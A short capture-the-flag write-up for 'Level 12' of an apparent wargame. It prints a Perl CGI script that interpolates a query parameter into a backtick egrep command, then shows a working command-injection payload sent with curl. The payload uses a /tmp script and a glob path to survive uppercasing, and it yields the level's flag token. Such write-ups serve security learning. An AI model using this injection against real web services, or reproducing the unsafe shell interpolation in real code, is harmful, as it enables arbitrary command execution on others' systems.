# Level 12

## step 1 : analyze level12.pl
```
$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

## step 2 : shell injection
```
$ echo "getflag > /tmp/flag12" > /tmp/HELLO
$ chmod 777 /tmp/HELLO
$ curl localhost:4646/?x='`/*/HELLO`'
$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
